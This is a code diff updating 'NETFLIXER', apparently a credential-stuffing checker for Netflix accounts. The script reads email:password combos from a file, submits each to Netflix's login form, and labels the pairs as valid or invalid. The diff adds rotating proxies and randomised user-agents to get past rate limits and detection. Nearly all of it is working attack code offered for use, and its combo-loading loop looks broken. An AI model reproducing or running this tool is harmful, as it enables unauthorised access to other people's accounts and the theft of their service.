@@ -1,4 +1,5 @@
-import os,requests
+import os,requests,random
+from fake_useragent import UserAgent
 from bs4 import BeautifulSoup as Soup
 
 YELLOW = '\033[93m'
@@ -7,7 +8,7 @@ RED = '\033[91m'
 RESET = '\033[0m' 
 
 def banner():
-    os.system('cls && title [NETFLIXER v1] - Made by Plasmonix' if os.name == "nt" else 'clear') 
+    os.system('cls && title [NETFLIXER v2] - Made by Plasmonix' if os.name == "nt" else 'clear') 
     text = """    
                        ███▄    █ ▓█████▄▄▄█████▓  █████▒██▓     ██▓▒██   ██▒▓█████  ██▀███  
                        ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓██   ▒▓██▒    ▓██▒▒▒ █ █ ▒░▓█   ▀ ▓██ ▒ ██▒
@@ -27,29 +28,44 @@ def banner():
             if red > 255:
                 red = 255
     print(faded)
-    print(YELLOW + "                                       github.com/Plasmonix Version 1.0 \n" + RESET)
+    print(YELLOW + "                                       github.com/Plasmonix Version 2.0 \n" + RESET)
 
-banner()
-
-def check_file():
+def load_combo():
+    global email,password
     try :
         combolist = open("combo.txt", "r").readlines()
         for combos in combolist:
-            email=combos.split(":")[0]
+            email = combos.split(":")[0]
             password=combos.split(":")[1]
-            check_account(email,password)
+        load_proxies()
     except FileNotFoundError :
            print(RED + """ [ERROR] combo.txt not found """ + RESET)
 
+proxies = []
+def load_proxies():
+    try :
+        proxyfile = open("proxies.txt", "r").readlines()
+        for proxy in proxyfile:
+            ip = proxy.split(":")[0]
+            port = proxy.split(":")[1]
+            proxies.append({'https': 'http://'+ ip + ':' + port.rstrip("\n")})
+        check_account(email,password)
+    except FileNotFoundError :
+           print(RED + """ [ERROR] proxies.txt not found """ + RESET)
+
+def get_random(data):
+    return random.choice(data)
+
 def check_account(email,password):
     client = requests.Session()
+    proxy = get_random(proxies)
     login = client.get("https://www.netflix.com/login")
     soup = Soup(login.text,'html.parser')
     loginForm = soup.find('form')
     authURL = loginForm.find('input', {'name': 'authURL'}).get('value')
     
     headers = {
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
+        "user-agent":  UserAgent().random,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
         "accept-language": "en-US,en;q=0.9", 
         "accept-encoding": "gzip, deflate, br", 
@@ -73,8 +89,13 @@ def check_account(email,password):
         "recaptchaResponseToken": "",
         "recaptchaResponseTime": "473"
     }
+    
+    try :
+        request = client.post("https://www.netflix.com/login",headers=headers,data=data,proxies=proxy)
+    except :
+        print(RED + " [ERROR] Failed to establish connection" + RESET)
+        quit()
 
-    request = client.post("https://www.netflix.com/login",headers=headers,data=data)
     logged = request.text.find('name="authURL"')
     if logged == -1:
         print(GREEN +" [GOOD] " + email + ":" + password.rstrip("\n")+ RESET)
@@ -84,4 +105,5 @@ def check_account(email,password):
         print(RED +" [BAD] " + email + ":" + password.rstrip("\n")+ RESET)
 
 if __name__ == "__main__":
-    check_file()
+    banner()
+    load_combo()
